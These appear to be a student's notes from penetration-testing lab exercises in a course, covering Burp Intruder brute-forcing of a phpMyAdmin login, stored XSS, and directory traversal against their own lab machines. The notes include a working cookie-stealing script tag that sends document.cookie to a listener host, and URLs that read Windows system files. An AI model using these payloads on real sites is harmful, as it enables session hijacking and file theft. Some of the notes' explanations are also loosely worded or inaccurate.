# 9.5.2. Practice - Exploiting Admin Consoles
#### Exercises

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Use Burp Intruder to gain access to the phpMyAdmin site running on your Windows 10 lab machine.

- We spot a phpmyadmin login portal located at the following URL `http://192.168.231.10/phpmyadmin/`
- In order to brute-force the login we must first capture the request in Burp Suite
- we then must set the correct payload variables and set the attack type to "Pitchforkl"
- Finally, we setup the payloads via the "Grep Extract" section in Intruder, capturing the response 
- Once these steps are complete we can brute force the password 


2.  Insert a new user into the "users" table.
- Once logged in, creating a user is fairly simple. Start with navigating to the "User Accounts" tab
- Click the "Create New User" button


# 9.6.6 Practice - XSS
#### Exercises

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Exploit the XSS vulnerability in the sample application to get the admin cookie and hijack the session. Remember to use the PowerShell script on your Windows 10 lab machine to simulate the admin login.
- First must craft an XSS that was successfully steal the cookie of an administrator. We will setup a listener on port 80 and use the following snippet:
- `<script>new Image().src="http://IP.ADDRESS/cool.jpg?output="+document.cookie;</script>`
-  We then input this into the "Comments" section of the web form.
- To test the validity of the XSS we then run the powershell script on the Windows machine
- We can see that the cookie was set to our listener, enabling us to adjust our cookie and hijack the admin's session

2.  Consider what other ways an XSS vulnerability in this application might be used for attacks.
	As this is a stored XSS there are numerous possible ways to exploit this XSS which would have severe implications on the server and its user's.

3.  Does this exploit attack the server or clients of the site?
As this is a stored XSS the server is on the recieving end. That being said, any user who visits the page is suseptable to attack.

# 9.7.2. Practice - Directory Traversal Vulnerabilities

## Practice - Directory Traversal Vulnerabilities

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Exploit the directory traversal vulnerability to read arbitrary files on your Windows 10 lab machine.

This exploit only requires us to visit the following url:
`http://192.168.231.10/menu.php?file=current_menu.php`

From there we can edit the field after `menu.php?file=` to any file we wish to read, for example:
`http://192.168.231.10/menu.php?file=c:\windows\system32\drivers\etc\hosts`